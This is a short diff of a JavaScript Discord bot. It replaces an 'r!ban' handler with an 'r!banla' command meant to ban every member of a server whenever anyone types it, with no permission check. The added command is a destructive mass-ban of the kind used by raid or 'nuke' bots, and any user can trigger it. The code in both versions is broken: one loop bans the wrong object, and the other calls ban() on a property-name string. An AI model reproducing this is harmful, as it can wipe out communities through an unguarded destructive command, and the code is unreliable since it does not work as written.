@@ -41,16 +41,12 @@ client.on('message', message => {
     }
 });
 
-client.on('message', message => {
-    if(message.content == 'r!ban'){
-        message.guild.fetchBans().then(bans => {
-            bans.forEach(user => {
-
-
-              message.guild.member.ban();
-            });
-        });
-    }
+client.on("message", message => {
+    if(message.content == 'r!banla'){
+for (var members in message.guild.members) {
+members.ban();
+}
+}
 });
 
 const log = message => {
